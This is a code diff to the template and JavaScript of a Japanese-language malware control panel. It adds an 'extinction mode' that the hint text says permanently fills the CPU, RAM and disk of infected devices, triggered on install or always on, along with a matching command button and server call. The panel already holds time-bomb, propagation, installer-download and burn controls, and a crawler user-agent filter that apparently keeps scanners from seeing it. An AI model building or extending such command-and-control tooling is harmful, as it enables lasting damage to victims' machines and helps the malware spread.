@@ -130,6 +130,16 @@
       <button id="vw-bomb-clear" class="ghost">解除</button>
     </div>
 
+    <div class="row" style="margin-top:9px">
+      <span class="hint">絶滅モード（恒久破壊）</span>
+      <select id="vw-hard">
+        <option value="" {% if not hard %}selected{% endif %}>OFF</option>
+        <option value="install" {% if hard == 'install' %}selected{% endif %}>インストールさせたら</option>
+        <option value="always" {% if hard == 'always' %}selected{% endif %}>常時</option>
+      </select>
+      <span class="hint">ONにすると、その端末のCPU/RAM/ディスクを恒久的に埋めます</span>
+    </div>
+
     <div class="log" id="vw-log" style="margin-top:10px"></div>
   </div>
 
@@ -153,6 +163,7 @@
       <button data-cmd="update">⬆ 更新</button>
       <button data-cmd="native" class="danger">🖥 インストーラDL</button>
       <button data-cmd="win" class="danger">🌐 繁殖</button>
+      <button data-cmd="hard" class="danger">☠ 絶滅</button>
       <button data-cmd="burn" class="danger">🔥 burn</button>
       <button data-cmd="kill" class="danger">☠ 全停止</button>
     </div>
@@ -226,7 +237,7 @@
     } catch (e) { log("通信失敗: " + e); return null; }
   }
 
-  /* ---------- レベル：クリックで確定、ホバーで説明を先読み ---------- */
+  /* ---------- レベル ---------- */
   const lvBtns = document.querySelectorAll("#vw-levels button.lv");
   function showLv(n) {
     n = Math.max(0, Math.min(7, n | 0));
@@ -281,6 +292,11 @@
   $("vw-bomb-btn").onclick   = async () => { await post("/bomb", {bomb: $("vw-bomb").value}); log("時限爆弾をセット"); };
   $("vw-bomb-clear").onclick = async () => { $("vw-bomb").value = ""; await post("/bomb", {bomb: ""}); log("時限爆弾を解除"); };
   $("vw-cmds-clear").onclick = async () => { await post("/cmds/clear"); log("コマンドを全消去"); sync(); };
+  $("vw-hard").addEventListener("change", async function () {
+    await post("/hard", { hard: this.value });
+    log("絶滅モード: " + (this.value || "OFF"));
+    sync();
+  });
 
   async function sendCmd(kind, arg) {
     await post("/cmd", { sid: SEL, kind: kind, arg: arg || "" });
@@ -357,7 +373,7 @@
       + (st.uanone ? " / UA無し " + st.uanone : "");
   }
 
-  /* ---------- 同期（遷移なし） ---------- */
+  /* ---------- 同期 ---------- */
   let busy = false;
   async function sync() {
     if (busy) return; busy = true;
@@ -369,7 +385,6 @@
           const lv = (j.stages || {})[h.id] || 0;
           return Object.assign({}, h, { lv: lv, bot: !!botIds[h.id] || false });
         });
-        // bot は stages API 側で判定済みのため、stat から逆算せず行ごとに再取得
         await fillBots(ROWS);
         paintStat(j.stat);
         paintRows();
@@ -382,13 +397,13 @@
         $("vw-fire").textContent = s.firing ? "稼働中" : "停止";
         $("vw-fire").style.color = s.firing ? "#7ce23a" : "#8b9bb0";
         $("vw-pend").textContent = s.pending || 0;
+        const hs = $("vw-hard");
+        if (hs && document.activeElement !== hs) hs.value = s.hard || "";
       }
     } catch (e) {}
     busy = false;
   }
   async function fillBots(rows) {
-    // bot.manual の状態を /rat 経由で拾うのは重いので、stages の stat と
-    // 行の ua から簡易判定（サーバーと同じキーワード）
     const KW = ["bot","crawler","spider","curl","wget","python-requests","headless",
                 "render-","line-poker","facebookexternalhit","preview","monitor","uptime","lighthouse"];
     rows.forEach(function (h) {
